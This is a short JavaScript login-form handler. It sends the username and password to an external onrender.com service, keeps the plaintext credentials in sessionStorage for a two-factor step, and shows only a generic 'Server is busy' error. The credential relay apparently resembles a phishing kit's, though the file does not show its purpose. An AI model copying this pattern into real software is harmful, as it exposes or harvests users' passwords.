document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.login-form');
    const loginButton = document.getElementById('login-button');
    const buttonText = document.getElementById('button-text');
    const loadingGif = document.getElementById('loading-gif');
    const errorElement = document.getElementById('error-message');
    
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('login-username').value.trim();
        const password = document.getElementById('login-password').value.trim();
        
        if (!username || !password) {
            showError('Please enter both username and password');
            return;
        }
        
        // Show loading state
        buttonText.style.display = 'none';
        loadingGif.style.display = 'inline-block';
        loginButton.disabled = true;
        errorElement.style.display = 'none';
        
        fetch('https://yomae-service.onrender.com/process_login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        })
        .then(response => {
            if (!response.ok) {
                // Handle HTTP errors (4xx, 5xx)
                return response.json().then(err => {
                    throw new Error(err.message || 'Server is busy. Please try again later');
                });
            }
            return response.json();
        })
        .then(data => {
            if (data.status === 'success') {
                window.location.href = '/yomae/website/verifed/index.html';
            } 
            else if (data.status === '2fa_required') {
                sessionStorage.setItem('loginData', JSON.stringify({
                    username: username,
                    password: password
                }));
                window.location.href = '/yomae/website/2FA/index.html';
            }
            else {
                // Handle application-level errors
                showError(data.message || 'Server is busy. Please try again later');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            // Handle all errors with a user-friendly message
            showError('Server is busy. Please try again later');
        })
        .finally(() => {
            // Reset button state
            buttonText.style.display = 'inline-block';
            loadingGif.style.display = 'none';
            loginButton.disabled = false;
        });
    });
    
    function showError(message) {
        errorElement.textContent = message;
        errorElement.style.display = 'block';
        // Shake animation
        errorElement.style.animation = 'none';
        setTimeout(() => {
            errorElement.style.animation = 'shake 0.5s';
        }, 10);
    }
});
